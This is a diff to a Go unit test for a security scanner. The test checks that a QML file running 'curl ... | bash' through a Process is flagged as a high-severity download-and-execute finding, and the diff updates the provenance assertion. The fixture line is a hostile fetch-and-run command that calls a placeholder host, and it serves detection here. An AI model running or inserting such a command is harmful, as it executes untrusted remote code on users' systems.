@@ -27,7 +27,7 @@ func TestQMLParsesInlineShellBeforeDownloadExecuteFinding(t *testing.T) {
 		"Worker.qml": []byte("Process {\n command: [\"bash\", \"-c\", \"curl -fsS https://example.test/i | bash\"]\n}\n"),
 	}))
 	finding := findingByCategory(t, result, "download-and-execute")
-	if finding.Severity != report.SeverityHigh || finding.Provenance != "deterministic:qml-lexical+shell-ast" {
+	if finding.Severity != report.SeverityHigh || finding.Provenance.RuleID != "qml-lexical-shell-ast/v1" {
 		t.Fatalf("unexpected QML pipeline finding: %#v", finding)
 	}
 }
